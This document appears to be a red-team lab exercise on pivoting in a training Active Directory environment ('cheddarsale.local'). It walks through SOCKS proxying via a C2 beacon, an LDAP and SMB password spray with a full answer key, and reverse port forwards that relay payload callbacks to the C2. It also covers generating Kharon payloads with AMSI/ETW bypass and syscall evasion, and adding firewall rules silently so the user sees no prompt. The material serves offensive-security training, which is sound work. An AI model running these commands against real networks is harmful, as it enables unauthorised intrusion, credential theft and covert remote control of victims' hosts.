# LAB 6 — Pivoting

Linking agents P2P, SMB/TCP pivots, SOCKS proxying, traversing segmented networks, reaching DC01 through WS01.

---

## Task 1 — SOCKS Proxy

### Part 1 — Setup

- Start a SOCKS proxy on an active agent:
    - `help socks start`
    - Set `sleep 0` on the beacon
    - `socks start 1080`

- Configure proxychains:
```bash
sudo nano /etc/proxychains4.conf
```
Comment out `socks4` and add `socks5` in the `[ProxyList]` section:
```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 9050
socks5  127.0.0.1 1080
```

- Test the proxy:
```bash
proxychains4 -q nmap -T5 -sT -Pn 192.168.57.10 -p80,88
```

### Part 2 — Password Spray

- Obtain the password policy through the SOCKS proxy:
    - Use `ldapsearch`
    - `-D` is `seth.hawkins@cheddarsale.local`
    - Escape special characters in the password
    - LDAP query: `(objectClass=domainDNS)` with attributes `minPwdLength pwdHistoryLength maxPwdAge minPwdAge lockoutThreshold lockoutDuration`

- Test netexec using seth.hawkins (password is in `email.html` from LAB 4):
    - Use SMB
    - Target: WS01

- Create a users list and export it to a file using netexec

- How many users have the `ChangeMe1234!@#$` password?

- How many of those users are administrators on WS01?

- Check if the passwords found in user descriptions are still valid — do any have admin permissions on WS01?

---

## Task 2 — Port Forwarding

This demonstrates a reverse port forward through a compromised host. A payload is configured to call back to WS01:8673, which relays the traffic to the C2 on port 6767. This simulates a scenario where a host can reach WS01 but not the C2 directly.

### Part 1 — Create a New Listener

Create a new HTTP listener that binds on port 6767 with a callback address pointing to WS01.
- Name: `HTTP-6767`
- Protocol: `external (http)`
- Bind: `0.0.0.0:6767`
- Callback address: `192.168.57.31:8673`
- Click `Generate` to create an encryption key
- Click `Use SSL (HTTPS)`
- Click `Create`

> **Note:** The bind and callback addresses are intentionally different — the C2 listens on 6767, but the payload calls back to WS01:8673 which relays the traffic.

### Part 2 — Generate a Payload

- Generate a payload for the `HTTP-6767` listener:
    - Listener: `HTTP-6767`
    - Agent: `beacon`
    - Profile: `portfwd_dll`
    - Format: `DLL`
    - Save as: `portfwd_agent.x64.dll`

- Process with Reflectra on Kali:
```bash
cd /opt/reflectra
./build.sh ~/AdaptixProjects/<YOUR PROJECT>/Payloads/portfwd_agent.x64.dll ~/AdaptixProjects/<YOUR PROJECT>/Payloads/portfwd
```

- Copy the stub to WS01:
```bash
scp ~/AdaptixProjects/<YOUR PROJECT>/Payloads/portfwd/stub.exe vagrant@192.168.57.31:C:/DevTools/portfwd.exe
```  
> **Note:** The payload is copied to `C:\DevTools` (excluded from Windows Defender) to focus on the port forwarding technique, not AV/EDR evasion.

### Part 3 — Setup the Port Forward

:no_entry: ***OPSEC:***  Windows Firewall intercepts any application that tries to open a new listening port and displays a dialog asking the logged-in user to allow or block it. Clicking allow requires local admin rights, and clicking cancel creates an explicit block rule — either outcome is visible to the user and leaves forensic artifacts.

![Alert](../images/alert.png)

To avoid this, pre-create an inbound allow rule before opening the port. Rule creation and deletion via `firewallrule` BOF or `New-NetFirewallRule` happen silently — no dialog is shown to the user.

> **Note:** Adding firewall rules requires an elevated (admin or SYSTEM) beacon. Confirm with `getuid` before proceeding.

- Create the firewall rule on WS01 before starting the port forward:
```bash
beacon> getuid
beacon> firewallrule add 8673 "8673-In" in -d "Port forward rule"
```

- Start the reverse port forward — listens on 8673 and relays to the C2 on port 6767:
```bash
beacon> rportfwd start 8673 192.168.57.40 6767
```

- Verify the port is listening:
```bash
beacon> netstat ipv4 tcp
```

- Execute the payload:
```bash
beacon> ps run C:\DevTools\portfwd.exe
```

- Confirm a new beacon calls back via the port forward.

### Part 4 — File Transfer Through the Port Forward

This demonstrates that the port forward relays any TCP traffic, not just C2 callbacks. This simulates how an operator could pull tools or scripts into a host with no direct internet access — for example, via SQL `xp_cmdshell` on an internal host that can only reach WS01.

- Terminate the call back for `portfwd.exe`

- Pause the `HTTP-6767` listener so port 6767 is free on the C2:
    - Right-click `HTTP-6767` in the Listeners panel → `Pause`

- On Kali, create a test file and host it with updog on port 6767:
```bash
cd ~
echo "Port forward file transfer test" > test.txt
updog -p 6767
```

- From the WS01 beacon, download `test.txt` through the port forward:
```bash
beacon> powershell Invoke-WebRequest -Uri "http://127.0.0.1:8673/test.txt" -OutFile C:\DevTools\test.txt
beacon> cat C:\DevTools\test.txt
```

- Confirm the file contents are printed. Stop updog with `Ctrl+C` and restart the `HTTP-6767` listener if needed.

### Part 5 — Clean Up

```bash
beacon> rportfwd stop 8673
beacon> powershell Remove-NetFirewallRule -DisplayName "8673-In"
```

> Verify the port is no longer listening: `netstat ipv4 tcp`

---

## Task 3 — Kharon Port Forward

This repeats the port forward demonstration using a Kharon agent. The key difference is that the Kharon profile's callback host must point to the rportfwd address on WS01, not the C2 directly. Kharon does not have P2P payloads to enable calling back from a host that cannot directly talk to the internet.  

**Port map:**
| Role | Address |
|------|---------|
| C2 bind | `192.168.57.40:7070` |
| rportfwd on WS01 | `192.168.57.31:7474` |
| Kharon callback (in profile) | `192.168.57.31:7474` |

### Part 1 — Create the Kharon Profile and Listener

- On Kali, generate a new profile and SSL certificate:
```bash
cd ~/AdaptixProjects/<YOUR PROJECT>
jq '.callbacks[0].hosts = ["192.168.57.31:7474"]' /opt/Kharon/listener_kharon_http/profiles/example1.json > kharon_portfwd.json
openssl req -x509 -nodes -newkey rsa:2048 -keyout kharon_portfwd.rsa.key -out kharon_portfwd.rsa.crt -days 365 -subj "/C=US/ST=State/L=City/O=Organization/OU=Unit/CN=localhost"
```

- Create the listener in the Adaptix client:
    - Name: `KharonPortFwd`
    - Protocol: `external (http)`
    - Config: `KharonHTTP`
    - Host & port (Bind): `0.0.0.0 7070`
    - Upload Profile: select `kharon_portfwd.json`
    - Click `Use SSL (HTTPS)` and select `kharon_portfwd.rsa.crt` and `kharon_portfwd.rsa.key`
    - Click `Create`

### Part 2 — Generate a Kharon Payload

- Generate a payload for the `KharonPortFwd` listener:
    - Listener: `KharonPortFwd`
    - Agent: `kharon`
    - Profile: `kharon_portfwd_agent`
    - Format: `Exe`
    - Fork pipename: `\\.\pipe\LOCAL\mojo.18848.18960.615186056296201775`
    - Spawn to: `C:\Windows\System32\werfault.exe`
    - Bypass: `AMSI + ETW`
    - Syscall: `Stack Spoof + Indirect + BOF API Proxy`
    - Sleep Mask: `Timer + Heap Obfuscation`
    - Save as: `kharon_portfwd.x64.exe`

- Copy to WS01:
```bash
scp ~/AdaptixProjects/<YOUR PROJECT>/Payloads/kharon_portfwd.x64.exe vagrant@192.168.57.31:C:/DevTools/kharon_portfwd.x64.exe
```

> **Note:** The payload is copied to `C:\DevTools` (excluded from Windows Defender) to focus on the port forwarding technique, not AV/EDR evasion.

### Part 3 — Setup and Execute

- From an elevated WS01 beacon, create the firewall rule and start the port forward:
```bash
beacon> getuid
beacon> firewallrule add 7474 "7474-In" in -d "Kharon port forward rule"
beacon> rportfwd start 7474 192.168.57.40 7070
beacon> netstat ipv4 tcp
```

- Execute the Kharon payload:
```bash
beacon> ps run C:\DevTools\kharon_portfwd.x64.exe
```

- Confirm the Kharon agent calls back through the port forward.

### Part 4 — Clean Up

```bash
beacon> rportfwd stop 7474
beacon> powershell Remove-NetFirewallRule -DisplayName "7474-In"
```

---

## Answers

<details>
<summary>Task 1 Part 2 — Password Spray</summary>

- Obtain password policy:

```bash
proxychains4 -q ldapsearch -x -H ldap://192.168.57.10 \
  -D "seth.hawkins@cheddarsale.local" \
  -w "ChangeMe1234\!@#\$" \
  -b "DC=cheddarsale,DC=local" \
  "(objectClass=domainDNS)" \
  minPwdLength pwdHistoryLength maxPwdAge minPwdAge lockoutThreshold lockoutDuration
```

- Test netexec with seth.hawkins:

```bash
proxychains4 netexec smb WS01 -u seth.hawkins -p "ChangeMe1234\!@#\$"
```

- Create a users list:

```bash
proxychains4 netexec ldap DC01 -u seth.hawkins -p "ChangeMe1234\!@#\$" --users --users-export USERS_EXPORT
```

- How many users have the `ChangeMe1234!@#$` password?

```bash
proxychains4 -q netexec ldap DC01 -u USERS_EXPORT -p "ChangeMe1234\!@#\$" --continue-on-success --log spraylog
cat spraylog | grep "[+]" | wc -l
```

- How many of those users are WS01 administrators?

```bash
cat spraylog | grep "[+]" | awk -F"] " '{print $2}' | awk -F"\\" '{print $2}' | awk -F":" '{print $1}' > WS01admintest.txt
proxychains4 -q netexec smb WS01 -u WS01admintest.txt -p "ChangeMe1234\!@#\$" --continue-on-success --log AdminCheck
cat AdminCheck | grep "Pwn3d" | wc -l
```

- Check description passwords against WS01 (4 users with description passwords are also WS01 admins):

```bash
proxychains4 -q ldapsearch -x -H ldap://192.168.57.10 \
  -D "seth.hawkins@cheddarsale.local" \
  -w "ChangeMe1234\!@#\$" \
  -b "DC=cheddarsale,DC=local" \
  "(&(objectCategory=person)(objectClass=user)(description=*pass*))" \
  cn description | grep -E "^cn:|^description:" | paste - - -d"," > output

sed 's/cn: \([^,]*\),.*/\1/' output > users.txt
sed 's/.*(Password: \(.*\))/\1/' output > passwords.txt

proxychains4 -q netexec smb WS01 -u users.txt -p passwords.txt --continue-on-success --no-bruteforce
```

- Do the WS01 admins have a path to Domain Admin? Check in BloodHound with owned users marked.

</details>
